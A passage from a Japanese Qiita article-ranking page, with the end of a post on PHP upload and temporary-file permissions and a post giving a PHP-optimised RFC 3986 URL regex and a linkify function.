<span id="windows環境の場合" class="fragment"></span><a href="#windows%E7%92%B0%E5%A2%83%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><strong>Windows環境の場合</strong>
</h3>

<p>WindowsAPIの <code>GetTempFileName</code> 関数はテンポラリファイルを作成するが、作成直後にパーミッションを <code>0600</code> に手動変更しているのが見て取れる。</p>

<h3>
<span id="mkstemp-関数が利用可能なlinux環境の場合" class="fragment"></span><a href="#mkstemp-%E9%96%A2%E6%95%B0%E3%81%8C%E5%88%A9%E7%94%A8%E5%8F%AF%E8%83%BD%E3%81%AAlinux%E7%92%B0%E5%A2%83%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><strong><code>mkstemp</code> 関数が利用可能なLinux環境の場合</strong>
</h3>

<p>現在のほとんどの環境で使用されているglibcはバージョン2.0.7以降という条件を満たしており、その場合はパーミッション <code>0600</code> として作成される。</p>

<h3>
<span id="mkstemp-関数が利用できないlinux環境の場合" class="fragment"></span><a href="#mkstemp-%E9%96%A2%E6%95%B0%E3%81%8C%E5%88%A9%E7%94%A8%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84linux%E7%92%B0%E5%A2%83%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><strong><code>mkstemp</code> 関数が利用できないLinux環境の場合</strong>
</h3>

<p>「そもそもこんな環境が存在するのか…？」と疑問に感じたが、一応そのケースでコールされている <code>VCWD_OPEN</code> マクロを辿ってみると、何やら存在しない引数を得ようとしてしまうようなコードが目に入る。 <code>O_CREAT</code> をフラグに指定している場合はそもそも使うべきマクロは <code>VCWD_OPEN_MODE</code> であり、これでパーミッションを第3引数に指定する必要がある。もしくは <code>VCWD_CREAT</code> を使用する必要がある。もし強引に <code>VCWD_OPEN</code> を利用してファイルを作成しようとした場合、 <strong>パーミッションの値は未定義</strong> となる。おそらくバグだと思われる。</p>

<h2>
<span id="move_uploaded_file-関数-is_uploaded_file-関数はどちらか1つで十分" class="fragment"></span><a href="#move_uploaded_file-%E9%96%A2%E6%95%B0-is_uploaded_file-%E9%96%A2%E6%95%B0%E3%81%AF%E3%81%A9%E3%81%A1%E3%82%89%E3%81%8B1%E3%81%A4%E3%81%A7%E5%8D%81%E5%88%86"><i class="fa fa-link"></i></a><strong><a href="http://www.php.net/manual/ja/function.move-uploaded-file.php" rel="nofollow noopener" target="_blank">move_uploaded_file</a> 関数・ <a href="http://www.php.net/manual/ja/function.is-uploaded-file.php" rel="nofollow noopener" target="_blank">is_uploaded_file</a> 関数はどちらか1つで十分</strong>
</h2>

<p>コメント欄で指摘されている通り、この関数の最初のブロックでは <strong><a href="http://www.php.net/manual/ja/function.is-uploaded-file.php" rel="nofollow noopener" target="_blank">is_uploaded_file</a></strong> 関数と同等のチェックが行われているため、 <strong><a href="http://www.php.net/manual/ja/function.is-uploaded-file.php" rel="nofollow noopener" target="_blank">is_uploaded_file</a></strong> とこの関数を併用する必要性は例え <strong><a href="http://www.php.net/manual/ja/security.globals.php" rel="nofollow noopener" target="_blank">register_globals</a></strong> が有効であったとしても皆無である。</p>

<h2>
<span id="移動後のファイルのパーミッションに一貫性が無い" class="fragment"></span><a href="#%E7%A7%BB%E5%8B%95%E5%BE%8C%E3%81%AE%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%91%E3%83%BC%E3%83%9F%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E4%B8%80%E8%B2%AB%E6%80%A7%E3%81%8C%E7%84%A1%E3%81%84"><i class="fa fa-link"></i></a><strong>移動後のファイルのパーミッションに一貫性が無い</strong>
</h2>

<p><strong>重要な前提条件</strong><br>
ファイル内容が上書きされるとき、<ins>パーミッションまでは上書きされない</ins>。</p>

<p><code>VCWD_RENAME</code> マクロをコールしているところに着目してほしい。リネームが成功したとき、Windows環境でなければその下のパーミッション変更処理が適用される。この変更は <strong>PHP5.2.5</strong> のときに行われたようだ。</p>

<p>失敗したときには手段が変わるが、本質的にはリネームと同等の処理が行われるようになっている。 <strong><a href="http://www.php.net/manual/ja/ini.core.php#ini.open-basedir" rel="nofollow noopener" target="_blank">open_basedir</a></strong> ディレクティブが関係しているようだが、ここで重要なのは<ins>後者のフローではパーミッション変更処理が行われない</ins>ことにある。これによって以下のような差異が生まれてしまう。</p>

<h3>
<span id="php525以降" class="fragment"></span><a href="#php525%E4%BB%A5%E9%99%8D"><i class="fa fa-link"></i></a><strong>PHP5.2.5以降</strong>
</h3>

<table>
<thead>
<tr>
<th style="text-align: center"></th>
<th style="text-align: center"><strong><a href="http://www.php.net/manual/ja/function.copy.php" rel="nofollow noopener" target="_blank">copy</a></strong></th>
<th style="text-align: center"><strong><a href="http://www.php.net/manual/ja/function.move-uploaded-file.php" rel="nofollow noopener" target="_blank">move_uploaded_file</a></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">
<code>php_copy_file_*</code> 関数による<br>新規コピー</td>
<td style="text-align: center">
<strong><a href="http://www.php.net/manual/ja/function.umask.php" rel="nofollow noopener" target="_blank">umask</a></strong> 設定値が<br>適用される</td>
<td style="text-align: center">
<strong><a href="http://www.php.net/manual/ja/function.umask.php" rel="nofollow noopener" target="_blank">umask</a></strong> 設定値が<br>適用される</td>
</tr>
<tr>
<td style="text-align: center">
<code>VCWD_RENAME</code> マクロによる<br>新規リネーム</td>
<td style="text-align: center">-</td>
<td style="text-align: center">
<strong><a href="http://www.php.net/manual/ja/function.umask.php" rel="nofollow noopener" target="_blank">umask</a></strong> 設定値が<br>適用される</td>
</tr>
<tr>
<td style="text-align: center">
<code>php_copy_file_*</code> 関数による<br>上書きコピー</td>
<td style="text-align: center">もとのパーミッションが<br>維持される</td>
<td style="text-align: center">もとのパーミッションが<br>維持される</td>
</tr>
<tr>
<td style="text-align: center">
<code>VCWD_RENAME</code> マクロによる<br>上書きリネーム</td>
<td style="text-align: center">-</td>
<td style="text-align: center">
<strong><a href="http://www.php.net/manual/ja/function.umask.php" rel="nofollow noopener" target="_blank">umask</a></strong> 設定値が<br>適用される</td>
</tr>
</tbody>
</table>

<h3>
<span id="php524以前" class="fragment"></span><a href="#php524%E4%BB%A5%E5%89%8D"><i class="fa fa-link"></i></a><strong>PHP5.2.4以前</strong>
</h3>

<table>
<thead>
<tr>
<th style="text-align: center"></th>
<th style="text-align: center"><strong><a href="http://www.php.net/manual/ja/function.copy.php" rel="nofollow noopener" target="_blank">copy</a></strong></th>
<th style="text-align: center"><strong><a href="http://www.php.net/manual/ja/function.move-uploaded-file.php" rel="nofollow noopener" target="_blank">move_uploaded_file</a></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">
<code>php_copy_file_*</code> 関数による<br>新規コピー</td>
<td style="text-align: center">
<strong><a href="http://www.php.net/manual/ja/function.umask.php" rel="nofollow noopener" target="_blank">umask</a></strong> 設定値が<br>適用される</td>
<td style="text-align: center">
<strong><a href="http://www.php.net/manual/ja/function.umask.php" rel="nofollow noopener" target="_blank">umask</a></strong> 設定値が<br>適用される</td>
</tr>
<tr>
<td style="text-align: center">
<code>VCWD_RENAME</code> マクロによる<br>新規リネーム</td>
<td style="text-align: center">-</td>
<td style="text-align: center">もとのパーミッションが<br>維持される</td>
</tr>
<tr>
<td style="text-align: center">
<code>php_copy_file_*</code> 関数による<br>上書きコピー</td>
<td style="text-align: center">もとのパーミッションが<br>維持される</td>
<td style="text-align: center">もとのパーミッションが<br>維持される</td>
</tr>
<tr>
<td style="text-align: center">
<code>VCWD_RENAME</code> マクロによる<br>上書きリネーム</td>
<td style="text-align: center">-</td>
<td style="text-align: center">もとのパーミッションが<br>維持される</td>
</tr>
</tbody>
</table>

<p>検証してみたところ、手元の <strong>PHP5.5.10</strong> の環境では <code>php_copy_file_*</code> 関数による上書き、 <strong><a href="http://atpages.jp/" rel="nofollow noopener" target="_blank">atpages.jp</a></strong> の <strong>PHP5.3.3</strong> の環境では <code>VCWD_RENAME</code> マクロによる上書きが行われているようであった。どうしてこんな中途半端なアップデートしたんだよ、やるならもうちょっと一貫性持たせろよ…</p>

<h1>
<span id="結論" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96"><i class="fa fa-link"></i></a><strong>結論</strong>
</h1>

<ul>
<li>ファイルを <strong><a href="http://www.php.net/manual/ja/function.move-uploaded-file.php" rel="nofollow noopener" target="_blank">move_uploaded_file</a></strong> 関数で移動させてもいいし、 <strong><a href="http://www.php.net/manual/ja/function.copy.php" rel="nofollow noopener" target="_blank">copy</a></strong> 関数でコピーしてもいい。</li>
<li>移動またはコピーにどちらの関数を用いたとしても、パーミッションを直後に <strong><a href="http://www.php.net/manual/ja/function.chmod.php" rel="nofollow noopener" target="_blank">chmod</a></strong> 関数によって定めておくのが一番無難である。 <strong><a href="http://www.php.net/manual/ja/function.umask.php" rel="nofollow noopener" target="_blank">umask</a></strong> 関数による設定方法はスクリプト全体に影響を及ぼす上に、上書き時の挙動に一貫性が無いので推奨されない。</li>
<li>
<strong><a href="http://www.php.net/manual/ja/function.is-uploaded-file.php" rel="nofollow noopener" target="_blank">is_uploaded_file</a></strong> 関数を使う必要性は全くない。</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />23位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>56</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/1e422848030fcde0f29a">「RFC3986定義の厳密なHTTP URIの正規表現」をPHP用に最適化</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-10-25 02:16:36</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[正規表現]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="元ネタ" class="fragment"></span><a href="#%E5%85%83%E3%83%8D%E3%82%BF"><i class="fa fa-link"></i></a>元ネタ</h1>

<p><a href="http://sinya8282.sakura.ne.jp/?p=1064" rel="nofollow noopener" target="_blank">RFC3986定義の厳密なHTTP URIの正規表現</a></p>

<h1>
<span id="何をしたか" class="fragment"></span><a href="#%E4%BD%95%E3%82%92%E3%81%97%E3%81%9F%E3%81%8B"><i class="fa fa-link"></i></a>何をしたか</h1>

<p>PHP向けに以下の編集を行いました。</p>

<ul>
<li>適当な文字数毎に分割した文字列リテラルに<br>(Atomなどのエディタは一行が長すぎると重くなる)</li>
<li>デリミタ <strong>`</strong> を付加</li>
<li>
<code>i</code> 修飾子を付加</li>
<li>グループに関して、全て<ins>キャプチャ無し</ins>に</li>
<li>繰り返しパターンに関して、全て<ins>バックトラックを行わない</ins>よう独占的に</li>
<li><strong><code>aaahttp://</code>などにはマッチしないように，先頭に単語境界の判定を付加</strong></li>
</ul>

<h1>
<span id="コード" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>コード</h1>

<h2>
<span id="正規表現" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE"><i class="fa fa-link"></i></a>正規表現</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$regex</span> <span class="o">=</span> 
    <span class="s1">'`\bhttps?+:(?://(?:(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]'</span> <span class="o">.</span>
    <span class="s1">'|[!$&amp;-,:;=])*+@)?+(?:\[(?:(?:[0-9a-f]{1,4}:){6}(?:'</span> <span class="o">.</span>
    <span class="s1">'[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2'</span> <span class="o">.</span>
    <span class="s1">'[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
    <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
    <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|::(?:[0-9a-f'</span> <span class="o">.</span>
    <span class="s1">']{1,4}:){5}(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1'</span> <span class="o">.</span>
    <span class="s1">'-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{'</span> <span class="o">.</span>
    <span class="s1">'2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\\'</span> <span class="o">.</span>
    <span class="s1">'d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])'</span> <span class="o">.</span>
    <span class="s1">')|(?:[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:){4}(?:[0-'</span> <span class="o">.</span>
    <span class="s1">'9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2[0-'</span> <span class="o">.</span>
    <span class="s1">'4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-'</span> <span class="o">.</span>
    <span class="s1">'5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d'</span> <span class="o">.</span>
    <span class="s1">'|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-f]{'</span> <span class="o">.</span>
    <span class="s1">'1,4}:)?+[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:){3}(?:'</span> <span class="o">.</span>
    <span class="s1">'[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2'</span> <span class="o">.</span>
    <span class="s1">'[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
    <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
    <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-'</span> <span class="o">.</span>
    <span class="s1">'f]{1,4}:){0,2}[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:)'</span> <span class="o">.</span>
    <span class="s1">'{2}(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\\'</span> <span class="o">.</span>
    <span class="s1">'d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4'</span> <span class="o">.</span>
    <span class="s1">']\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5'</span> <span class="o">.</span>
    <span class="s1">'])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:'</span> <span class="o">.</span>
    <span class="s1">'[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?+::[0-9a-f]{1,4'</span> <span class="o">.</span>
    <span class="s1">'}:(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d'</span> <span class="o">.</span>
    <span class="s1">'{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]'</span> <span class="o">.</span>
    <span class="s1">'\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]'</span> <span class="o">.</span>
    <span class="s1">')\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:['</span> <span class="o">.</span>
    <span class="s1">'0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?+::(?:[0-9a-f]{1'</span> <span class="o">.</span>
    <span class="s1">',4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
    <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
    <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\\'</span> <span class="o">.</span>
    <span class="s1">'d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-f]{1,4}:){'</span> <span class="o">.</span>
    <span class="s1">'0,5}[0-9a-f]{1,4})?+::[0-9a-f]{1,4}|(?:(?:[0-9a-f]'</span> <span class="o">.</span>
    <span class="s1">'{1,4}:){0,6}[0-9a-f]{1,4})?+::|v[0-9a-f]++\.[!$&amp;-.'</span> <span class="o">.</span>
    <span class="s1">'0-;=_a-z~]++)\]|(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0'</span> <span class="o">.</span>
    <span class="s1">'-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\\'</span> <span class="o">.</span>
    <span class="s1">'d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|'</span> <span class="o">.</span>
    <span class="s1">'1\d{2}|2[0-4]\d|25[0-5])|(?:[-.0-9_a-z~]|%[0-9a-f]'</span> <span class="o">.</span>
    <span class="s1">'[0-9a-f]|[!$&amp;-,;=])*+)(?::\d*+)?+(?:/(?:[-.0-9_a-z'</span> <span class="o">.</span>
    <span class="s1">'~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+)*+|/(?:(?:[-.0'</span> <span class="o">.</span>
    <span class="s1">'-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])++(?:/(?:[-'</span> <span class="o">.</span>
    <span class="s1">'.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+)*+)?+|'</span> <span class="o">.</span>
    <span class="s1">'(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])++(?'</span> <span class="o">.</span>
    <span class="s1">':/(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+'</span> <span class="o">.</span>
    <span class="s1">')*+)?+(?:\?+(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;'</span> <span class="o">.</span>
    <span class="s1">'-,/:;=?+@])*+)?+(?:#(?:[-.0-9_a-z~]|%[0-9a-f][0-9a'</span> <span class="o">.</span>
    <span class="s1">'-f]|[!$&amp;-,/:;=?+@])*+)?+`i'</span>
<span class="p">;</span>
</pre></div></div>

<h2>
<span id="基本実装例" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E5%AE%9F%E8%A3%85%E4%BE%8B"><i class="fa fa-link"></i></a>基本実装例</h2>

<p>HTML特殊文字の置換とURLに対する自動リンクを同時に行います。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">escape_and_linkify</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$regex</span> <span class="o">=</span> 
        <span class="s1">'`\bhttps?+:(?://(?:(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]'</span> <span class="o">.</span>
        <span class="s1">'|[!$&amp;-,:;=])*+@)?+(?:\[(?:(?:[0-9a-f]{1,4}:){6}(?:'</span> <span class="o">.</span>
        <span class="s1">'[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2'</span> <span class="o">.</span>
        <span class="s1">'[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
        <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
        <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|::(?:[0-9a-f'</span> <span class="o">.</span>
        <span class="s1">']{1,4}:){5}(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1'</span> <span class="o">.</span>
        <span class="s1">'-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{'</span> <span class="o">.</span>
        <span class="s1">'2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\\'</span> <span class="o">.</span>
        <span class="s1">'d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])'</span> <span class="o">.</span>
        <span class="s1">')|(?:[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:){4}(?:[0-'</span> <span class="o">.</span>
        <span class="s1">'9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2[0-'</span> <span class="o">.</span>
        <span class="s1">'4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-'</span> <span class="o">.</span>
        <span class="s1">'5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d'</span> <span class="o">.</span>
        <span class="s1">'|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-f]{'</span> <span class="o">.</span>
        <span class="s1">'1,4}:)?+[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:){3}(?:'</span> <span class="o">.</span>
        <span class="s1">'[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2'</span> <span class="o">.</span>
        <span class="s1">'[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
        <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
        <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-'</span> <span class="o">.</span>
        <span class="s1">'f]{1,4}:){0,2}[0-9a-f]{1,4})?+::(?:[0-9a-f]{1,4}:)'</span> <span class="o">.</span>
        <span class="s1">'{2}(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\\'</span> <span class="o">.</span>
        <span class="s1">'d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4'</span> <span class="o">.</span>
        <span class="s1">']\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5'</span> <span class="o">.</span>
        <span class="s1">'])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:'</span> <span class="o">.</span>
        <span class="s1">'[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?+::[0-9a-f]{1,4'</span> <span class="o">.</span>
        <span class="s1">'}:(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d'</span> <span class="o">.</span>
        <span class="s1">'{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]'</span> <span class="o">.</span>
        <span class="s1">'\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]'</span> <span class="o">.</span>
        <span class="s1">')\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:['</span> <span class="o">.</span>
        <span class="s1">'0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?+::(?:[0-9a-f]{1'</span> <span class="o">.</span>
        <span class="s1">',4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
        <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
        <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\\'</span> <span class="o">.</span>
        <span class="s1">'d|1\d{2}|2[0-4]\d|25[0-5]))|(?:(?:[0-9a-f]{1,4}:){'</span> <span class="o">.</span>
        <span class="s1">'0,5}[0-9a-f]{1,4})?+::[0-9a-f]{1,4}|(?:(?:[0-9a-f]'</span> <span class="o">.</span>
        <span class="s1">'{1,4}:){0,6}[0-9a-f]{1,4})?+::|v[0-9a-f]++\.[!$&amp;-.'</span> <span class="o">.</span>
        <span class="s1">'0-;=_a-z~]++)\]|(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0'</span> <span class="o">.</span>
        <span class="s1">'-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\\'</span> <span class="o">.</span>
        <span class="s1">'d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|'</span> <span class="o">.</span>
        <span class="s1">'1\d{2}|2[0-4]\d|25[0-5])|(?:[-.0-9_a-z~]|%[0-9a-f]'</span> <span class="o">.</span>
        <span class="s1">'[0-9a-f]|[!$&amp;-,;=])*+)(?::\d*+)?+(?:/(?:[-.0-9_a-z'</span> <span class="o">.</span>
        <span class="s1">'~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+)*+|/(?:(?:[-.0'</span> <span class="o">.</span>
        <span class="s1">'-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])++(?:/(?:[-'</span> <span class="o">.</span>
        <span class="s1">'.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+)*+)?+|'</span> <span class="o">.</span>
        <span class="s1">'(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])++(?'</span> <span class="o">.</span>
        <span class="s1">':/(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;-,:;=@])*+'</span> <span class="o">.</span>
        <span class="s1">')*+)?+(?:\?+(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]|[!$&amp;'</span> <span class="o">.</span>
        <span class="s1">'-,/:;=?+@])*+)?+(?:#(?:[-.0-9_a-z~]|%[0-9a-f][0-9a'</span> <span class="o">.</span>
        <span class="s1">'-f]|[!$&amp;-,/:;=?+@])*+)?+`i'</span>
    <span class="p">;</span>
    <span class="nv">$replacement</span> <span class="o">=</span> <span class="s1">'&lt;a href="$0"&gt;$0&lt;/a&gt;'</span><span class="p">;</span>
    <span class="nv">$str</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$regex</span><span class="p">,</span> <span class="nv">$replacement</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$str</span> <span class="o">=</span> <span class="s1">'&gt;&gt;10 Qiitaって何じゃねーよggrks https://www.google.co.jp/search?q=qiita'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nx">escape_and_linkify</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
</pre></div></div>

<p>こうなります。</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="ni">&amp;gt;&amp;gt;</span>10 Qiitaって何じゃねーよggrks <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://www.google.co.jp/search?q=qiita"</span><span class="p">&gt;</span>https://www.google.co.jp/search?q=qiita<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div></div>

<h2>
<span id="応用実装例" class="fragment"></span><a href="#%E5%BF%9C%E7%94%A8%E5%AE%9F%E8%A3%85%E4%BE%8B"><i class="fa fa-link"></i></a>応用実装例</h2>

<p>掲示板スクリプトで、一般的なURLをリンクするのと同時に <code>&gt;&gt;10</code> といったアンカーもリンクする場合<br>
<code>$regex</code> の先頭と末尾を少し書き換えています。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">escape_and_linkify</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$regex</span> <span class="o">=</span> 
        <span class="s1">'`(?:\bhttps?+:(?://(?:(?:[-.0-9_a-z~]|%[0-9a-f][0-9a-f]'</span> <span class="o">.</span>
        <span class="s1">'|[!$&amp;-,:;=])*+@)?+(?:\[(?:(?:[0-9a-f]{1,4}:){6}(?:'</span> <span class="o">.</span>
        <span class="s1">'[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1-9]\d|1\d{2}|2'</span> <span class="o">.</span>
        <span class="s1">'[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25'</span> <span class="o">.</span>
        <span class="s1">'[0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?'</span> <span class="o">.</span>
        <span class="s1">':\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))|::(?:[0-9a-f'</span> <span class="o">.</span>
        <span class="s1">']{1,4}:){5}(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:\d|[1'</span> <span class="o">.</span>
        <span class="s1">'-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.(?:\d|[1-9]\d|1\d{'</span> <span class="o">.</span>
